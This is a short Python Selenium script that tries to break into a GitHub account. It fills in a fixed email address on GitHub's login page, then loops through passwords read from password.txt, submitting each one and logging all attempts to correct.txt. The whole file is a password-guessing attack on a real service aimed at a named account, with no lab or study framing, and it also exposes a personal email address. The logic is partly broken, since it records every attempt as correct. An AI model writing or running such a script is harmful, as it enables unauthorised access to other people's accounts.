from selenium import webdriver
from selenium.webdriver.common.by import By
import time


driver = webdriver.Chrome()

driver.get('https://github.com/login')

email_field = driver.find_element(By.ID, 'login_field')
email_field.clear()
email_field.send_keys('ehirimchiedozie96@yahoo.com')

correct_password = open('correct.txt', 'w')

with open('password.txt', 'r') as passwords:
    content = passwords.read().split('\n')

for password in content:

    password_field = driver.find_element(By.ID, 'password')
    password_field.clear()
    password_field.send_keys(password)

    correct_password.write(password +'\n')

    submit_field = driver.find_element(By.CLASS_NAME, 'btn-primary')
    submit_field.click()


time.sleep(120)